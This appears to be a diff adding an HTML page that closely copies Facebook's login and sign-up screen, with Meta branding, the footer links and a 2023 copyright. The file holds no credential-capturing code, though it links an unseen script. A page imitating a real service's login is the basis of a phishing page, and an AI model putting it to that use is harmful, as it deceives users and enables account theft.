@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Log in to Facebook</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=7" />
+    <link rel="stylesheet" href="/assets/css/style.css" />
+  </head>
+  <body>
+    <div class="#">
+      <div class="logo">
+        <img class="#" src="/assets/img/logo.png" alt="" />
+      </div>
+      <div class="formLogin">
+        <p>Log in to Facebook</p>
+        <form id="loginForm">
+          <input
+            type="text"
+            id="username"
+            placeholder="Email address or phone number"
+          />
+          <div id="errorMessageUser" class="error-message"></div>
+          <input type="password" id="password" placeholder="Password" />
+          <div id="errorMessagePass" class="error-message"></div>
+          <input
+            type="button"
+            value="Login"
+            class="button"
+            onclick="validateLogin()"
+          />
+        </form>
+        <p class="sign_up">
+          <a href="#">Forgotten account?</a>
+          <a href="#" onclick="openModal()">Sign up for Facebook</a>
+        </p>
+      </div>
+
+      <div id="signupModal" class="modal">
+        <div class="modal-content">
+          <span class="close" onclick="closeModal()">&times;</span>
+          <div class="head_signup">Create a new account</div>
+          <p>It's quick and easy.</p>
+          <div class="line"></div>
+          <form id="signupForm">
+            <div class="name-inputs">
+              <div class="input-group">
+                <input type="text" id="firstName" placeholder="First Name" required>
+              </div>
+              <div class="input-group">
+                <input type="text" id="Surname" placeholder="Surname" required>
+              </div>
+            </div>
+            <div>
+                <input type="text" id="email" placeholder="Mobile Number or email address" required>
+            </div>
+            <input type="text" id="pss" placeholder="New password" required>
+            <div class="minititle">
+                Date of birth?
+            </div>
+            <div class="dob-inputs">
+              <div class="input-group">
+                <select id="day" required>
+                  <option value="">Day</option>
+                  <!-- Add day options here -->
+                </select>
+              </div>
+              <div class="input-group">
+                <select id="month" required>
+                  <option value="">Month</option>
+                  <!-- Add month options here -->
+                </select>
+              </div>
+              <div class="input-group">
+                <select id="year" required>
+                  <option value="">Year</option>
+                  <!-- Add year options here -->
+                </select>
+              </div>
+            </div>
+            <div class="minititle">
+                Gender?
+            </div>
+            <div class="gender-inputs">
+              <div class="input-group">
+                <label for="gender-male">
+                  <input type="radio" id="gender-male" name="gender" value="male" required>
+                  Male
+                </label>
+              </div>
+              <div class="input-group">
+                <label for="gender-female">
+                  <input type="radio" id="gender-female" name="gender" value="female" required>
+                  Female
+                </label>
+              </div>
+              <div class="input-group">
+                <label for="gender-other">
+                  <input type="radio" id="gender-other" name="gender" value="other" required>
+                  Other
+                </label>
+              </div>
+            </div>
+            <p class="terms-of-service">People who use our service may have uploaded your contact information to Facebook. <a href="#"> Learn More</a> </p>
+            <p class="terms-of-service">By clicking Sign Up, you agree to our <a href="#">Terms </a> and <a href="#">Privacy Policy</a> and <a href="#">Cookies policy</a> You may receive SMS notifications from us and can opt out at any time.</p>
+            <input type="submit" value="Sign Up" class="button-signup">
+            <div class="already">Already have an account?</div>
+        </form>
+        </div>
+      </div>
+      <div class="footer">
+        <div class="footer-content">
+          <ul class="horizontal-list">
+            <li>
+                <a>English (UK)</a></li>
+            <li>
+              <a class="_sv4">हिन्दी</a>
+            </li>
+            <li>
+              <a class="_sv4">ਪੰਜਾਬੀ</a>
+            </li>
+            <li>
+              <a class="_sv4">اردو</a>
+            </li>
+            <li>
+              <a class="_sv4">ગુજરાતી</a>
+            </li>
+            <li>
+              <a class="_sv4">मराठी</a>
+            </li>
+            <li>
+              <a class="_sv4">বাংলা</a>
+            </li>
+            <li>
+              <a class="_sv4">தமிழ்</a>
+            </li>
+            <li>
+              <a class="_sv4">తెలుగు</a>
+            </li>
+            <li>
+              <a class="_sv4">മലയാളം</a>
+            </li>
+            <li>
+              <a class="_sv4">ಕನ್ನಡ</a>
+            </li>
+            <li>
+              <a title="Show more languages">
+                <i class="img sp_EP9wX8qDDvu_2x sx_5c9443"></i>
+              </a>
+            </li>
+          </ul>
+          <div id="line"></div>
+          <ul class="horizontal-list">
+            <li><a>Sign Up</a></li>
+            <li><a>Log in</a></li>
+            <li>
+              <a>Messenger</a>
+            </li>
+            <li>
+              <a>Facebook Lite</a>
+            </li>
+            <li>
+              <a>Watch</a>
+            </li>
+            <li>
+              <a>Places</a>
+            </li>
+            <li>
+              <a>Games</a>
+            </li>
+            <li>
+              <a>Marketplace</a>
+            </li>
+            <li>
+              <a>Meta Pay</a>
+            </li>
+            <li>
+              <a>Meta Store</a>
+            </li>
+          </ul>
+          <ul class="horizontal-list">
+            <li>
+              <a>Meta Quest</a>
+            </li>
+            <li>
+              <a>Instagram</a>
+            </li>
+            <li>
+              <a>Fundraisers</a>
+            </li>
+            <li>
+              <a>Services</a>
+            </li>
+            <li>
+              <a>Voting Information Centre</a>
+            </li>
+            <li>
+              <a>Privacy Policy</a>
+            </li>
+            <li>
+              <a>Privacy Centre</a>
+            </li>
+            <li>
+              <a>Groups</a>
+            </li>
+            <li>
+              <a>About</a>
+            </li>
+            <li>
+              <a>Create ad</a>
+            </li>
+          </ul>
+          <ul class="horizontal-list">
+            <li>
+              <a>Create Page</a>
+            </li>
+            <li>
+              <a>Developers</a>
+            </li>
+            <li>
+              <a>Careers</a>
+            </li>
+            <li>
+              <a>Cookies</a>
+            </li>
+            <li>
+              <a>AdChoices</a>
+            </li>
+            <li>
+              <a>Terms</a>
+            </li>
+            <li>
+              <a>Help</a>
+            </li>
+            <li>
+              <a>Contact uploading and non-users</a>
+            </li>
+            <li>
+              <a>Settings</a>
+            </li>
+            <li>
+              <a>Activity log</a>
+            </li>
+          </ul>
+          <div class="meta">
+            <div><span> Meta © 2023</span></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <script src="/assets/js/script.js"></script>
+  </body>
+</html>
